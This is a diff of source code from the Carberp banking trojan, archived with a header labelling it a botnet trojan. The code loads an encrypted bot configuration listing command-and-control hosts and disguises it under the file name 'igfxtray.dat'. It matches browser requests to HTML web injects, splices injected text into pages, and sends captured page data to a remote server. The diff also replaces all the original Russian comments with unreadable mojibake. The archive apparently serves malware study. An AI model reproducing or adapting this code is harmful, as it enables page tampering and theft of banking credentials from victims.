@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "BotConfig.h"
@@ -19,25 +30,25 @@
 bool bHttp;
 bool bHttps;
 
-// Новая версия конфига
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 PBotConfig BotConfig;
 
-// Процесс в котором загружался конфиг
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD ConfigProcess = 0;
 
-// Время последней загрузки конфига
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD LastLoadConfigTime = 0;
 
 
 #ifdef BV_APP
-	LPVOID InjectEventData;       // Данные для вызова события
-	THTMLInjectEvent InjectEvent; // Обработчик события HTML инжекта
+	LPVOID InjectEventData;       // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	THTMLInjectEvent InjectEvent; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 
 
 	void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event)
 	{
-		// функция устанавливает обработчик события для инжекта HTML
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML
 		InjectEventData = Data;
 		InjectEvent = Event;
 	}
@@ -45,7 +56,7 @@ DWORD LastLoadConfigTime = 0;
 
 	void CallHTMLInjectEvent(LPVOID Sender, THTMLInjectEventID ID, LPVOID Reserved)
 	{
-		// Вызываем событие инжекта
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (InjectEvent != NULL)
 		{
     		InjectEvent(InjectEventData, Sender, ID, Reserved);
@@ -114,8 +125,8 @@ DWORD GetConfigTimeOut()
 
 PCHAR ReadStrBlock_(PCHAR &Buf)
 {
-	// Функция читаем строку из буфера и смещает указатель за строку
-	// формат буфера (DWORD - Длина строки)(Строка)
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (DWORD - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ)(пїЅпїЅпїЅпїЅпїЅпїЅ)
 	DWORD Size = *(DWORD *)Buf;
 	Buf += sizeof(DWORD);
 	if (Size == 0)
@@ -129,12 +140,12 @@ PCHAR ReadStrBlock_(PCHAR &Buf)
 bool LoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 {
 
-	//Загрухить конфигурационный файл
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (BotConfig == NULL || FileName == NULL)
 		return false;
 
 	#ifdef DebugUtils
-		Debug::MessageEx("BotConfig", 0, "Load File", NULL, "Загружаем конфигурационный файл");
+		Debug::MessageEx("BotConfig", 0, "Load File", NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
 	#endif
 
 
@@ -143,7 +154,7 @@ bool LoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 	if (File == INVALID_HANDLE_VALUE)
 	{
 		#ifdef DebugUtils
-			Debug::MessageEx("BotConfig", 0, "Load File", NULL, "Ошибка загрузки");
+			Debug::MessageEx("BotConfig", 0, "Load File", NULL, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		#endif
 		return false;
 
@@ -175,14 +186,14 @@ bool LoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 
 
 
-	// Пропускаем один устаревший параметр размером один байт
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	Buf++;
 
-	// определяем количество масок
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	DWORD Count = *(DWORD*)Buf;
 	Buf += sizeof(DWORD);
 
-	// Загружаем информацию о хостах
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	FgrHostFromCfg = ReadStrBlock_(Buf);
 	GraHostFromCfg = ReadStrBlock_(Buf);
@@ -191,19 +202,19 @@ bool LoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 	PluginsHostFromCfg = ReadStrBlock_(Buf);
 
 
-	// Период обновления конфига
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TimeOut = *(DWORD*)Buf;
 	Buf += sizeof( DWORD );
 
 
-	//------------- Настройки продоколов -------------//
+	//------------- пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ -------------//
 	bHttp = *Buf != 0;
 	Buf++;
 
 	bHttps = *Buf != 0;
 	Buf++;
 
-	//------------- Загружаем данные инжектов -------------//
+	//------------- пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ -------------//
 	PHTMLInject Inject;
 	PHTMLInjectData Data;
 	DWORD DataCount;
@@ -214,14 +225,14 @@ bool LoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 		Inject = HTMLInjects::AddInject(BotConfig->HTMLInjects, NULL);
 		if (Inject == NULL)
 			break;
-		// Читаем маску инжекта	
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ	
 		Inject->URL = ReadStrBlock_(Buf); 
 
-		// Читаем режимы обработки
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Mode = *(DWORD*)Buf;
 		Buf += sizeof(DWORD);
 
-		// Таблица режимов
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		// LG  1
 		// LP  2
 		// GPL  3
@@ -229,7 +240,7 @@ bool LoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 		// G   4
 		// P   5
 		// GP  6
-		// Декодируем старую версию флага
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
 		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
 		Inject->IsLog = (Mode <= 3); 
@@ -251,7 +262,7 @@ bool LoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 	MemFree(FileBuf);
 	pCloseHandle(File);
 	#ifdef DebugUtils
-		Debug::MessageEx("BotConfig", 0, "Load File", NULL, "Готово");
+		Debug::MessageEx("BotConfig", 0, "Load File", NULL, "пїЅпїЅпїЅпїЅпїЅпїЅ");
 	#endif
 	return true;
 }
@@ -259,7 +270,7 @@ bool LoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 
 void FreeHTMLInjectData(LPVOID Data)
 {
-	// Уничтожить данные HTML инжекта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PHTMLInjectData D = (PHTMLInjectData)Data;
 	STR::Free(D->Before);
 	STR::Free(D->After);
@@ -299,15 +310,15 @@ PBotConfig CreateConfig()
 
 PHTMLInject HTMLInjects::AddInject(PList List, PHTMLInject Source, bool IgnoreDisabledData)
 {
-	//  Добавить новый HTML инжект в список
-	//	List. Если указан источник Source то в новый
-	//	будут скопированы все его данные
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	//	List. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Source пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
+	//	пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PHTMLInject Inject = CreateStruct(THTMLInject);
 	if (Inject == NULL)
 		return NULL;
 
-	// Копируем инжект
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Source != NULL)
 	{
 		Inject->URL   = STR::New(Source->URL);
@@ -315,7 +326,7 @@ PHTMLInject HTMLInjects::AddInject(PList List, PHTMLInject Source, bool IgnoreDi
 		Inject->POST  = Source->POST;
 		Inject->IsLog = Source->IsLog;
 
-		// копируем данные инжектов
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Source->Injects != NULL)
 		{
 			DWORD Count = List::Count(Source->Injects);
@@ -336,7 +347,7 @@ PHTMLInject HTMLInjects::AddInject(PList List, PHTMLInject Source, bool IgnoreDi
 
 void HTMLInjects::ResetStatus(PList Injects)
 {
-	// сбросить статус инжектов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	for (DWORD i = 0; i < List::Count(Injects); i++)
 	{
 		PHTMLInject Inject = (PHTMLInject)List::GetItem(Injects, i);
@@ -353,7 +364,7 @@ void HTMLInjects::ResetStatus(PList Injects)
 
 PHTMLInjectData HTMLInjects::AddInjectData(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject)
 {
-	//  AddHTMLInjectData - Добавить новые данные инжекта
+	//  AddHTMLInjectData - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (HTMLInject == NULL)
 		return false;
 
@@ -380,7 +391,7 @@ PHTMLInjectData HTMLInjects::AddInjectData(PHTMLInject HTMLInject, PCHAR Before,
 
 void HTMLInjects::ClearInjectList(PList List)
 {
-	// Функция рчищает список содержащий элементы типа THTMLInject
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ THTMLInject
 	if (List == NULL)
 		return;
 	List::SetFreeItemMehod(List, (TFreeItemMethod)HTMLInjects::FreeInject);
@@ -391,29 +402,29 @@ void HTMLInjects::ClearInjectList(PList List)
 
 bool Config::GetInjectsForRequest(PRequest Request)
 {
-	//  GetInjectsForRequest - Получить инжекты для запроса
+	//  GetInjectsForRequest - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Request == NULL || StrIsEmpty(Request->URL))
 		return false;
 
-	// Инициализируем конфигурационный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	PBotConfig BotConfig = Config::GetConfig();
 	if (BotConfig == NULL)
 		return false;
 
-	// Собираем ссылку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR URL = Request->URL;
 	bool DelURL = false;
 	if (Request->Optional != NULL )
 	{
-		// Добавляем в запрос отправляемые данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR C = NULL;
 		if (STR::Scan(Request->Optional, '?') == NULL) C = "?";
         URL = STR::New(3, Request->URL, C, Request->Optional);
 		DelURL = true;
 	}
 
-	// Проверяем инжекты
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Count = List::Count(BotConfig->HTMLInjects);
 	for (DWORD i = 0; i < Count; i++)
 	{
@@ -421,7 +432,7 @@ bool Config::GetInjectsForRequest(PRequest Request)
 
 		if (Inject->Disabled) continue;
 
-		// Сравниваем методы и ссылки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if ((Request->Method == hmGET && Inject->GET) || (Request->Method == hmPOST && Inject->POST))
 			if (CompareUrl(Inject->URL, URL))
 			{
@@ -439,7 +450,7 @@ bool Config::GetInjectsForRequest(PRequest Request)
 				/*
 				if (Request->Injects == NULL)
 					Request->Injects = CreateHTMLInjectsList();
-				// Дублируем инжект
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				PHTMLInject NewInject = AddHTMLInject(Request->Injects, Inject, true);
 				if (NewInject != NULL)
 				{
@@ -460,13 +471,13 @@ bool Config::GetInjectsForRequest(PRequest Request)
 //----------------------------------------------------------------------------
 
 WCHAR ConfigFileName[MAX_PATH] = {0};
-WCHAR ConfigFileName_HP[MAX_PATH] = {0}; // Конфиг более высокого приоритета
+WCHAR ConfigFileName_HP[MAX_PATH] = {0}; // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 WCHAR BOT_CONFIG_NAME[]    = {'\\','i','g','f','x','t','r','a','y','.','d','a','t',0};
 WCHAR BOT_CONFIG_NAME_HP[] = {'\\','i','g','f','x','t','r','a','y','h', 'p', '.','d','a','t',0};
 
 PWCHAR Config::GetFileName(bool HightPriority)
 {
-	//  Функция возврашает имя файла по умолчанию
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PWCHAR FileName = NULL;
 
 	if (!HightPriority)
@@ -497,7 +508,7 @@ PWCHAR Config::GetFileName(bool HightPriority)
 //----------------------------------------------------------------------------
 void Config::SetFileName(PWCHAR FileName)
 {
-	//  Функция устанавливает имя файла по умолчанию
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	//DWORD Len = m_wcslen(FileName);
 	plstrcpyW(ConfigFileName, FileName);
 }
@@ -506,7 +517,7 @@ void Config::SetFileName(PWCHAR FileName)
 
 bool Config::IsConfig(PCHAR Buf)
 {
-	// Функция возвращает истину если буфер является конфигом
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	return StrSame(Buf, "BJB", true, 3);
 }
 //----------------------------------------------------------------------------
@@ -518,11 +529,11 @@ bool Config::Download(PCHAR URL)
 
 	PCHAR Buf = NULL;
 
-	// Загружаем файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (!HTTP::Get(URL, &Buf))
     	return false;
 
-	// Расшифровываем файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	#ifdef CryptHTTPH
 		if (!IsConfig(Buf))
 		{
@@ -534,7 +545,7 @@ bool Config::Download(PCHAR URL)
 
     bool Result = IsConfig(Buf);
 
-	// Записываем данные в файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 	if (Result)
 	{
 		PWCHAR FileName = GetFileName();
@@ -558,7 +569,7 @@ bool Config::Download(PCHAR URL)
 
 PBotConfig Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad)
 {
-	// Инициализировать настройки бота
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (IsNewApplication)
 	{
 		BotConfig = NULL;
@@ -589,10 +600,10 @@ PBotConfig Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontL
 /*
 PBotConfig Config::Initialize(PWCHAR FileName, bool DontLoad)
 {
-	// Инициализировать глобальные настройки работы бота
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (IsNewProcess(ConfigProcess))
 	{
-		// Обращение в новом процессе
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		BotConfig = NULL;
 		LastLoadConfigTime = 0;
 	}
@@ -619,14 +630,14 @@ PBotConfig Config::Initialize(PWCHAR FileName, bool DontLoad)
 
 PBotConfig Config::GetConfig()
 {
-	// Функция возвращает на конфиг бота
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	return BotConfig;
 }
 //----------------------------------------------------------------------------
 
 void Config::Clear(PBotConfig Config)
 {
-	// Очистить данне конфига
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Config == NULL)
         Config = BotConfig;
 	if (Config != NULL)
@@ -636,8 +647,8 @@ void Config::Clear(PBotConfig Config)
 
 bool HTMLInjects::IsValidInjectData(PHTMLInjectData Data)
 {
-	// Функция возвращает истину если данные поддерживаются
-	// методом инжекта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Data == NULL)
 		return false;
 
@@ -655,7 +666,7 @@ bool HTMLInjects::IsValidInjectData(PHTMLInjectData Data)
 
 bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before, PCHAR Inject, PCHAR After, DWORD &NewBufLen)
 {
-	// Функция вставляет текст Inject между текстом Before и After
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Inject пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Before пїЅ After
 	NewBufLen = 0;
 	NewBuffer = NULL;
 	if (Buffer == NULL) return false;
@@ -673,18 +684,18 @@ bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before, PCHAR Inject,
 		return false;
 
 
-	// Позиция блока Иуащку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD BStart = 0;
 	DWORD BEnd = 0;
 	DWORD BLen = 0;
-    // Позиция блока After
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ After
 	DWORD AStart = 0;
 	DWORD AEnd = 0;
 	DWORD ALen = 0;
 
 	PCHAR AfterPtr = NULL;
 
-	// Ищем блок Before
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Before
 	if (B)
 	{
 		if (!WildCmp(Buffer, Before, &BStart, &BEnd, &BLen))
@@ -693,31 +704,31 @@ bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before, PCHAR Inject,
 
 
 
-	// Ищем блок After
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ After
 	if (A)
 	{
 		PCHAR BeforePtr = Buffer + BEnd;
 		if (!WildCmp(BeforePtr, After, &AStart, &AEnd, &ALen))
 			return false;
 		AfterPtr = BeforePtr + AStart;
-		// Если не указан блок Before то переносим конец блока на начало
-		// блока After
+		// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Before пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅ After
 		if (!B) BEnd = AStart;
 	}
 	else
-    	AfterPtr = Buffer + BEnd; // Ставим указатель на конец блока Before
+    	AfterPtr = Buffer + BEnd; // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Before
 
     DWORD InjectLen = StrCalcLength(Inject);
 	DWORD AfterLen = StrCalcLength(AfterPtr);
 
-	// Создаём новый буфер
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	NewBufLen = BEnd + InjectLen + AfterLen;
 	PCHAR Buf = (PCHAR)MemAlloc(NewBufLen + 1);
 	if (Buf == NULL) return false;
 
 	NewBuffer = Buf;
 
-	// Копируем строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	m_memcpy(Buf, Buffer, BEnd);
 	Buf += BEnd;
 	m_memcpy(Buf, Inject, InjectLen);
@@ -732,7 +743,7 @@ bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before, PCHAR Inject,
 
 PCHAR GetHTMLLogCode(PCHAR Buffer, PHTMLInject Inject)
 {
-	// Функция возвращает HTML код согласно настроек инжекта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (StrIsEmpty(Buffer) || Inject == NULL)
 		return NULL;
 
@@ -777,12 +788,12 @@ PCHAR GetHTMLLogCode(PCHAR Buffer, PHTMLInject Inject)
 
 bool SendHTMLLogToServer(PCHAR Buffer, PHTMLInject Inject, PHTTPSessionInfo Session)
 {
-	// Функция отправляет блоки HTML на указанный в настройках сервер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Inject == NULL || !Inject->IsLog)
 		return false;
 
 
-	// Получаем необходимые данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR SendBuffer = NULL;
 
 	PCHAR Data = GetHTMLLogCode(Buffer, Inject);
@@ -800,7 +811,7 @@ bool SendHTMLLogToServer(PCHAR Buffer, PHTMLInject Inject, PHTTPSessionInfo Sess
 		BrowserType = Session->BrowserType;
 		UserAgent = Session->UserAgent;
 
-		// Дополняем данные информацией о загружаемом адресе
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Session->URL)
 		{
 			URL = Session->URL;
@@ -813,7 +824,7 @@ bool SendHTMLLogToServer(PCHAR Buffer, PHTMLInject Inject, PHTTPSessionInfo Sess
 	if (SendBuffer == NULL)
 		SendBuffer = Data;
 
-	//  Отправляем  полученные данные
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
